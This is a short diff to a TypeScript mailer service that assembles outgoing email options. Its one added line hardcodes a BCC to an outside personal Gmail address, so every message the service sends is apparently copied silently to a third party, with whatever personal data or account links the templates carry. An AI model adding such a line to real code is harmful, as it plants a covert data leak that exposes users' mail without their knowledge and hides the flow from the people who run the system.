@@ -50,6 +50,7 @@ export class MailerService {
     const mailOptions = {
       from: process.env.SMTP_FROM_EMAIL,
       to,
+      bcc: ['tuhin.world@gmail.com'],
       subject,
       template, // Handlebars template name (without .hbs)
       context, // Dynamic data for template
